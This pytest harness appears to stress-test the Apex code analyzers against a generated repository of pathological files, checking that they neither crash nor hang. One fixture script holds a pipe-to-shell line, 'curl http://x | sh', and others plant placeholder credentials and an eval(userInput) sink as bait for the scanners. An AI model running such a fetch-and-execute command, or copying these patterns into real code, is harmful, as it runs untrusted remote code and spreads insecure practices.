"""Adversarial robustness harness — Apex analyzers vs. pathological input.

A buyer runs Apex on a GNARLY real codebase, not Apex's own A+99 source: 8000-line
generated files, 60-deep nesting, unicode/emoji identifiers, syntax errors, a UTF-8
BOM, mixed tabs+spaces, empty files, near-binary blobs, minified one-liners, and a
directory of hundreds of tiny files. This module proves the core analyzers DEGRADE
GRACEFULLY on every such fixture: each returns a well-formed (possibly empty) result,
raises no unhandled exception, and completes quickly (no pathological blowup / hang).

A hang is treated as a FAILURE, not a wedge: every analyzer call runs through
``_guard``, which executes it on a worker thread and FAILS the test if it overruns a
generous per-call budget instead of blocking the suite forever.

Determinism: no assertions on timestamps, wall-clock values, or unordered orderings —
only on result SHAPE (type / well-formedness) and on "did not raise / did not hang".
ADD-ONLY: this is the sole new file; no production code is touched.
"""

from __future__ import annotations

import threading
from pathlib import Path

import pytest

from app.engine import polyglot_findings, polyglot_metrics
from app.engine.dedup import find_duplicates
from app.engine.health_score import HealthScore, grade
from app.engine.idea_action_bridge import IdeaActionBridge
from app.engine.idea_permutation import IdeaPermutationEngine
from app.execution.semantic.transforms import merge_nested_if
from app.tools.project_profile import ProjectProfile, ProjectProfiler
from app.tools.simplification_scan import scan_simplifications

# Per-call wall-clock budget. Generous (so a slow-but-finite analysis on the gnarly
# fixture is not flaky), but finite — a true hang or quadratic blowup overruns it and
# FAILS the test loudly rather than wedging the run. Sized for the heaviest call
# (IdeaPermutationEngine.run on the whole gnarly tree ~25s in isolation) PLUS the
# CPU contention of the green gate's 4 parallel chunks, where a 30s budget tipped
# over. NB: ~25s for the engine on a gnarly repo is a real PERFORMANCE signal
# (R&D blind-spot #4 — scalability on large repos), tracked separately; it is not a
# hang, so this guard only catches genuine non-termination.
_BUDGET_SECONDS = 90.0


def _guard(label: str, fn):
    """Run ``fn()`` on a worker thread; FAIL if it raises or overruns the budget.

    Returns ``fn()``'s value on success. A raised exception inside the analyzer is a
    robustness bug (the analyzer must degrade, not crash); a timeout is a hang/blowup
    bug. Either way the failure message names the analyzer+fixture so the caller can
    reproduce it directly.
    """
    box: dict[str, object] = {}

    def _target():
        try:
            box["value"] = fn()
        except BaseException as exc:  # noqa: BLE001 — any crash is a reportable bug
            box["error"] = exc

    worker = threading.Thread(target=_target, daemon=True)
    worker.start()
    worker.join(_BUDGET_SECONDS)
    if worker.is_alive():
        pytest.fail(
            f"ROBUSTNESS BUG (HANG/BLOWUP): {label} did not complete within "
            f"{_BUDGET_SECONDS}s on the adversarial fixture."
        )
    if "error" in box:
        exc = box["error"]
        pytest.fail(
            f"ROBUSTNESS BUG (CRASH): {label} raised "
            f"{type(exc).__name__}: {exc} on the adversarial fixture."
        )
    return box.get("value")


# --------------------------------------------------------------------------- #
# Adversarial fixture tree (built once per test via tmp_path).
# --------------------------------------------------------------------------- #

def _build_gnarly_repo(root: Path) -> Path:
    """Materialise a directory full of pathological files and return it.

    Mixes Python and polyglot (.js/.yaml/.html/.sh) so every analyzer family has
    something in scope. Every file below is deliberately hostile to a naive scanner.
    """
    root.mkdir(parents=True, exist_ok=True)

    # 1. Very large generated-looking file: 8000+ lines of valid Python.
    big_lines = ["def f_{0}(x):\n    return x + {0}\n".format(i) for i in range(8000)]
    (root / "huge_generated.py").write_text("".join(big_lines), encoding="utf-8")

    # 2. One pathologically long line (200k chars) in a .py file.
    (root / "one_long_line.py").write_text(
        "data = '" + ("A" * 200_000) + "'\n", encoding="utf-8"
    )

    # 3. Deeply nested code: 60-level nested if (Python) — stresses parse/depth.
    nested = "def deep():\n"
    for d in range(60):
        nested += "    " * (d + 1) + f"if x{d}:\n"
    nested += "    " * 61 + "return 1\n"
    (root / "deep_nest.py").write_text(nested, encoding="utf-8")

    # 3b. Deeply nested braces in a polyglot file (depth heuristic stress).
    (root / "deep_braces.js").write_text(
        "const x = " + ("{a:" * 60) + "1" + ("}" * 60) + ";\n", encoding="utf-8"
    )

    # 4. Unicode / emoji identifiers and string literals.
    (root / "unicode_ident.py").write_text(
        "café_变量 = '🚀🔥 naïve façade — ☃'\n"
        "def función_λ(αβγ):\n    return αβγ * 2  # 注释 comment\n",
        encoding="utf-8",
    )

    # 5. Python file with a hard SYNTAX ERROR (unbalanced + missing colon).
    (root / "broken_syntax.py").write_text(
        "def broken(:\n    return [1, 2, 3\n\nclass Oops\n    pass\n",
        encoding="utf-8",
    )

    # 6. UTF-8 BOM-prefixed Python file.
    (root / "bom_file.py").write_text(
        "﻿import os\n\n\ndef bommed():\n    return os.getcwd()\n",
        encoding="utf-8",
    )

    # 7. Mixed tabs + spaces (TabError when parsed; indent heuristic stress).
    (root / "mixed_indent.py").write_text(
        "def mixed():\n\tif True:\n            return 1\n\t    return 2\n",
        encoding="utf-8",
    )

    # 8. Empty file.
    (root / "empty.py").write_text("", encoding="utf-8")

    # 9. Mostly non-text bytes (near-binary) with a .py extension.
    (root / "binary_blob.py").write_bytes(
        bytes(range(256)) * 64 + b"\x00\xff\xfe\x80\x81" * 200
    )

    # 9b. Near-binary polyglot blob too.
    (root / "blob.yaml").write_bytes(b"\x00\x01\x02\xff\xfe" * 500 + b"key: value\n")

    # 10. Minified / one-liner .py (everything on a single physical line).
    (root / "minified.py").write_text(
        "import sys;x=[i for i in range(100)];y={k:v for k,v in enumerate(x)};"
        "z=lambda a:a;print(sum(x));sys.exit(0) if not x else None\n",
        encoding="utf-8",
    )

    # 11. Polyglot files carrying would-be secrets / findings (well-formed text).
    (root / "config.yaml").write_text(
        "password: hunter2\napi_key: AKIAIOSFODNN7EXAMPLE\nlist:\n  - a\n  - b\n",
        encoding="utf-8",
    )
    (root / "app.js").write_text(
        "const token = 'examplekey_abcdef0123456789';\neval(userInput);\n"
        "document.innerHTML = x;\n",
        encoding="utf-8",
    )
    (root / "index.html").write_text(
        "<html><body><script>var s='secret';</script></body></html>\n",
        encoding="utf-8",
    )
    (root / "run.sh").write_text(
        "#!/bin/sh\ncurl http://x | sh\nPASSWORD=letmein\n", encoding="utf-8"
    )

    # 12. A directory with hundreds of tiny files (walk/scale stress).
    swarm = root / "swarm"
    swarm.mkdir()
    for i in range(400):
        (swarm / f"t{i}.py").write_text(f"v = {i}\n", encoding="utf-8")

    return root


@pytest.fixture
def gnarly_repo(tmp_path: Path) -> Path:
    return _build_gnarly_repo(tmp_path / "repo")


# Individual pathological files, addressable by name, for the per-file transform/bridge
# probes (which take a single source string rather than a whole tree).
_PATHO_FILES = [
    "huge_generated.py",
    "one_long_line.py",
    "deep_nest.py",
    "unicode_ident.py",
    "broken_syntax.py",
    "bom_file.py",
    "mixed_indent.py",
    "empty.py",
    "binary_blob.py",
    "minified.py",
]

# The near-binary .py crashes the BRIDGE's on-disk reader (see the xfail below), so it
# is excluded from the in-memory bridge probe list and given its own dedicated test.
_BRIDGE_FILES = [f for f in _PATHO_FILES if f != "binary_blob.py"]


# --------------------------------------------------------------------------- #
# Whole-tree analyzers — must survive the entire gnarly repo.
# --------------------------------------------------------------------------- #

def test_health_score_grade_survives_gnarly_repo(gnarly_repo: Path):
    result = _guard("health_score.grade", lambda: grade(gnarly_repo))
    assert isinstance(result, HealthScore)
    assert isinstance(result.score, int)
    assert isinstance(result.letter, str) and result.letter
    assert isinstance(result.components, list)
    assert isinstance(result.fixes, list)


def test_idea_permutation_engine_run_survives_gnarly_repo(gnarly_repo: Path):
    # security_aware off and learning off: keep the run hermetic and bounded.
    engine = IdeaPermutationEngine(
        config={"security_aware": False, "learning": False},
        project_root=gnarly_repo,
    )
    report = _guard("IdeaPermutationEngine.run", engine.run)
    assert report is not None
    assert isinstance(report.ideas, list)
    assert isinstance(report.stats, dict)
    assert report.project_root == str(gnarly_repo)


def test_project_profiler_light_survives_gnarly_repo(gnarly_repo: Path):
    profiler = ProjectProfiler(gnarly_repo)
    profile = _guard(
        "ProjectProfiler.profile(light=True)", lambda: profiler.profile(light=True)
    )
    assert isinstance(profile, ProjectProfile)


def test_project_profiler_full_survives_gnarly_repo(gnarly_repo: Path):
    profiler = ProjectProfiler(gnarly_repo)
    profile = _guard(
        "ProjectProfiler.profile(light=False)", lambda: profiler.profile(light=False)
    )
    assert isinstance(profile, ProjectProfile)


# ROBUSTNESS BUG (found by this R&D harness, now FIXED): scan_simplifications read
# each candidate with read_text(encoding='utf-8') guarded only by `except OSError`,
# so a near-binary .py raised UnicodeDecodeError (a ValueError, not OSError) and
# crashed the whole scan. Fixed by widening the guard to (OSError, UnicodeDecodeError)
# and skipping the file. This now asserts the survival the bug used to break.
def test_scan_simplifications_survives_gnarly_repo(gnarly_repo: Path):
    result = _guard(
        "scan_simplifications", lambda: scan_simplifications(gnarly_repo)
    )
    assert isinstance(result, list)
    for row in result:
        assert isinstance(row, dict)
        assert "module" in row and "fact_label" in row


def test_find_duplicates_survives_gnarly_repo(gnarly_repo: Path):
    result = _guard("dedup.find_duplicates", lambda: find_duplicates(gnarly_repo))
    assert isinstance(result, list)


def test_polyglot_scan_metrics_survives_gnarly_repo(gnarly_repo: Path):
    result = _guard(
        "polyglot_metrics.scan_polyglot",
        lambda: polyglot_metrics.scan_polyglot(str(gnarly_repo)),
    )
    assert isinstance(result, list)
    for row in result:
        assert isinstance(row, dict)
        assert isinstance(row.get("loc"), int)
        assert isinstance(row.get("depth"), int)


def test_polyglot_hotspots_survives_gnarly_repo(gnarly_repo: Path):
    result = _guard(
        "polyglot_metrics.polyglot_hotspots",
        lambda: polyglot_metrics.polyglot_hotspots(str(gnarly_repo)),
    )
    assert isinstance(result, list)


def test_polyglot_summary_survives_gnarly_repo(gnarly_repo: Path):
    result = _guard(
        "polyglot_metrics.polyglot_summary",
        lambda: polyglot_metrics.polyglot_summary(str(gnarly_repo)),
    )
    assert isinstance(result, dict)


def test_polyglot_findings_survives_gnarly_repo(gnarly_repo: Path):
    result = _guard(
        "polyglot_findings.scan_polyglot_findings",
        lambda: polyglot_findings.scan_polyglot_findings(str(gnarly_repo)),
    )
    assert isinstance(result, list)
    for finding in result:
        assert isinstance(finding, dict)
        assert "path" in finding and "line" in finding


# --------------------------------------------------------------------------- #
# Per-file probes — bridge detector + a representative transform apply.
# Each must DECLINE (return None / a value), never crash, on every pathological file.
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("fname", _BRIDGE_FILES)
def test_bridge_detect_security_issue_survives_each_file(gnarly_repo: Path, fname: str):
    result = _guard(
        f"IdeaActionBridge._detect_security_issue[{fname}]",
        lambda: IdeaActionBridge._detect_security_issue(str(gnarly_repo), fname),
    )
    # Contract: a label (str) or None — never a raise.
    assert result is None or isinstance(result, str)


# ROBUSTNESS BUG (found by this R&D harness, now FIXED): IdeaActionBridge._read read
# with read_text(encoding='utf-8') guarded only by `except OSError`, so a near-binary
# .py raised UnicodeDecodeError (a ValueError, not OSError) that escaped
# _detect_security_issue. Fixed by catching (OSError, UnicodeDecodeError) and
# returning None. This now asserts the graceful decline the bug used to break.
def test_bridge_detect_security_issue_on_near_binary_py(gnarly_repo: Path):
    result = _guard(
        "IdeaActionBridge._detect_security_issue[binary_blob.py]",
        lambda: IdeaActionBridge._detect_security_issue(str(gnarly_repo), "binary_blob.py"),
    )
    assert result is None or isinstance(result, str)


@pytest.mark.parametrize("fname", _PATHO_FILES)
def test_transform_apply_survives_each_file(gnarly_repo: Path, fname: str):
    # Read bytes tolerantly (the binary blob is not valid UTF-8); the transform must
    # decline gracefully on whatever string it receives, not crash.
    raw = (gnarly_repo / fname).read_bytes()
    source = raw.decode("utf-8", errors="replace")
    result = _guard(
        f"merge_nested_if.apply[{fname}]",
        lambda: merge_nested_if.apply(fname, source, "dry-run"),
    )
    # A transform returns a patch result when it would act, or None when it declines.
    # On pathological input it must decline (or act safely) — the only forbidden
    # outcome is an unhandled exception, already caught by _guard.
    assert result is None or hasattr(result, "patch_requests")


def test_transform_apply_on_syntax_error_declines(gnarly_repo: Path):
    # Spotlight the syntax-error contract explicitly: the transform must DECLINE
    # (return None) on an unparseable file, never fabricate a patch or crash.
    source = (gnarly_repo / "broken_syntax.py").read_text(encoding="utf-8")
    result = _guard(
        "merge_nested_if.apply[broken_syntax]",
        lambda: merge_nested_if.apply("broken_syntax.py", source, "dry-run"),
    )
    assert result is None
